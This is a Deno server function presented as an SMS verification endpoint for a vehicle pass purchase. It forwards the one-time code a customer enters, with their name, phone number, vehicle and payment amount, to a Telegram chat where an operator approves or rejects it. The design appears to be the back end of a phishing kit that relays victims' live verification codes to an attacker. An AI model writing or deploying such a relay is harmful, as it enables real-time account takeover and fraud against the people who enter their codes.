import { serve } from "https://deno.land/std@0.190.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Simple in-memory store for pending verifications
// In production, this should be stored in a database
const pendingVerifications = new Map<string, {
  status: 'pending' | 'approved' | 'rejected',
  code: string,
  customerInfo: any,
  vehicle: any,
  duration: any,
  timestamp: number
}>();

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { userId, code, customerInfo, vehicle, duration } = await req.json();

    console.log('SMS verification request:', { userId, code, customerInfo: customerInfo?.fullName });

    if (!userId || !code || !customerInfo || !vehicle || !duration) {
      return new Response(
        JSON.stringify({ success: false, message: 'Missing required parameters' }),
        { 
          status: 400, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    // Generate verification ID
    const verificationId = `verify_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // Store verification in memory
    pendingVerifications.set(verificationId, {
      status: 'pending',
      code,
      customerInfo,
      vehicle,
      duration,
      timestamp: Date.now()
    });

    // Send message to Telegram with admin buttons
    const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const telegramChatId = Deno.env.get('TELEGRAM_CHAT_ID');

    if (!telegramBotToken || !telegramChatId) {
      console.error('Missing Telegram configuration');
      return new Response(
        JSON.stringify({ success: false, message: 'Telegram not configured' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    const message = `🔐 *SMS Verification Request*
    
👤 *Customer:* ${customerInfo.fullName}
📱 *Phone:* ${customerInfo.phone}
🔢 *Code Entered:* ${code}

🚗 *Vehicle:* ${vehicle.color} ${vehicle.make} ${vehicle.model}
🎫 *Pass:* ${duration.label}
💰 *Amount:* €${duration.discountedPrice.toFixed(2)}

Please verify if this code is correct:`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `verify_approve_${verificationId}` },
          { text: "❌ Reject", callback_data: `verify_reject_${verificationId}` }
        ]
      ]
    };

    const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      }),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Telegram API error:', errorText);
      return new Response(
        JSON.stringify({ success: false, message: 'Failed to send Telegram message' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    console.log('Verification request sent to Telegram:', verificationId);

    return new Response(
      JSON.stringify({ 
        success: true, 
        verificationId,
        message: 'Verification request sent to admin' 
      }),
      { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );

  } catch (error) {
    console.error('Error in verify-sms function:', error);
    return new Response(
      JSON.stringify({ success: false, message: error.message }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});

// Export the pending verifications for use by other functions
export { pendingVerifications };